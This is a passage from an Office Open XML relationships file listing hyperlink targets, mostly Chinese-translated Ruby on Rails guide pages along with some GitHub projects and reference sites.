Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId631" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId632" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId633" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId634" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId635" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId636" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId637" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId638" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId639" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId310" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.thoughtbot.com/projects/paperclip" TargetMode="External"/><Relationship Id="rId311" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://farfar.away/form" TargetMode="External"/><Relationship Id="rId312" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://farfar.away/form" TargetMode="External"/><Relationship Id="rId313" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/2_3_release_notes.html" TargetMode="External"/><Relationship Id="rId314" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/2_3_release_notes.html" TargetMode="External"/><Relationship Id="rId315" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/75" TargetMode="External"/><Relationship Id="rId316" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://media.pragprog.com/titles/fr_arr/multiple_models_one_form.pdf" TargetMode="External"/><Relationship Id="rId317" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/alloy/complex-form-examples/" TargetMode="External"/><Relationship Id="rId318" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/cainlevy/nested_assignment/tree/master" TargetMode="External"/><Relationship Id="rId319" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/cainlevy/complex-form-examples/tree/cainlevy" TargetMode="External"/><Relationship Id="rId190" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId191" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId192" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId193" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId194" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId195" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId196" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId197" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId198" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://weblog.jamisbuck.org/2006/10/18/skinny-controller-fat-model" TargetMode="External"/><Relationship Id="rId199" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId960" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sstephenson/execjs" TargetMode="External"/><Relationship Id="rId961" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sstephenson/execjs" TargetMode="External"/><Relationship Id="rId962" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId963" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Data_URI_scheme" TargetMode="External"/><Relationship Id="rId964" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://sass-lang.com/docs/yardoc/file.SASS_REFERENCE.html" TargetMode="External"/><Relationship Id="rId965" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Gzip" TargetMode="External"/><Relationship Id="rId966" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://developer.yahoo.com/yui/compressor/css.html" TargetMode="External"/><Relationship Id="rId967" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/lautis/uglifier" TargetMode="External"/><Relationship Id="rId968" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/mishoo/UglifyJS" TargetMode="External"/><Relationship Id="rId969" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sstephenson/execjs" TargetMode="External"/><Relationship Id="rId640" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId641" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId642" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId643" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId644" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://andrzejonsoftware.blogspot.com/2007/05/15-tdd-steps-to-create-rails.html" TargetMode="External"/><Relationship Id="rId645" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionDispatch/Assertions/SelectorAssertions.html" TargetMode="External"/><Relationship Id="rId646" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://ruby-doc.org/stdlib/libdoc/test/unit/rdoc/" TargetMode="External"/><Relationship Id="rId647" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://avdi.org/projects/nulldb/" TargetMode="External"/><Relationship Id="rId648" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/thoughtbot/factory_girl/tree/master" TargetMode="External"/><Relationship Id="rId649" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/notahat/machinist/tree/master" TargetMode="External"/><Relationship Id="rId320" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/jamesgolick/attribute_fu" TargetMode="External"/><Relationship Id="rId321" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId322" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId323" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId324" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId325" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId1000" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/configuring.html" TargetMode="External"/><Relationship Id="rId1001" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/configuring.html" TargetMode="External"/><Relationship Id="rId1002" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId1003" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1004" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1005" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1006" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1007" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1008" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1009" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId326" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId327" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId328" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId329" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId970" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sstephenson/execjs" TargetMode="External"/><Relationship Id="rId971" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/rtomayko/tilt" TargetMode="External"/><Relationship Id="rId972" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/asset_pipeline.html" TargetMode="External"/><Relationship Id="rId973" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId974" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId975" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId976" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId977" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId978" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId979" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId650" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.thoughtbot.com/projects/shoulda" TargetMode="External"/><Relationship Id="rId651" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://relishapp.com/rspec" TargetMode="External"/><Relationship Id="rId652" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId653" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId654" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId655" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId656" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId657" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId658" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId659" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId330" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId331" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId332" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId333" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId334" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId335" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId1010" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1011" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1012" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1013" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1014" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1015" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1016" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1017" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1018" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1019" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId336" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId338" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId339" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId980" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId981" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId982" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId983" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId984" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId985" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId986" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId987" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId988" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId989" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId660" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId661" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId662" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId663" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId664" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId665" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId666" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId667" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId668" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId669" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId340" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId341" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId342" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId343" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId344" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId345" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId1020" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1021" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1022" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1023" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1024" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1025" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1026" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1027" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1028" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1029" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId346" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId347" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId348" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId349" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId990" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId991" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId992" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId993" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/plataformatec/devise%EF%BC%8C%E4%B8%80%E4%B8%AA%E4%B8%BA%E5%85%B6%E7%88%B6%E7%A8%8B%E5%BA%8F%E6%8F%90%E4%BE%9B%E8%AE%A4%E8%AF%81%E7%9A%84" TargetMode="External"/><Relationship Id="rId994" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/radar/forem%EF%BC%8C%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BE%9B" TargetMode="External"/><Relationship Id="rId995" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/resolve/refinerycms%EF%BC%8C%E4%B8%80%E4%B8%AA" TargetMode="External"/><Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId997" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/getting_started.html" TargetMode="External"/><Relationship Id="rId998" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId999" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/engines.html" TargetMode="External"/><Relationship Id="rId670" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId671" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId672" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId673" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId674" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId675" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId676" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId677" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId678" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId679" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId350" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/action_controller_overview.html" TargetMode="External"/><Relationship Id="rId351" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://en.wikipedia.org/wiki/Representational_state_transfer" TargetMode="External"/><Relationship Id="rId352" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/layouts_and_rendering.html" TargetMode="External"/><Relationship Id="rId353" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActionController/ParamsWrapper.html" TargetMode="External"/><Relationship Id="rId354" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/security.html" TargetMode="External"/><Relationship Id="rId355" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId1030" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1031" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1032" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1033" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1034" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1035" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/initialization.html" TargetMode="External"/><Relationship Id="rId1036" 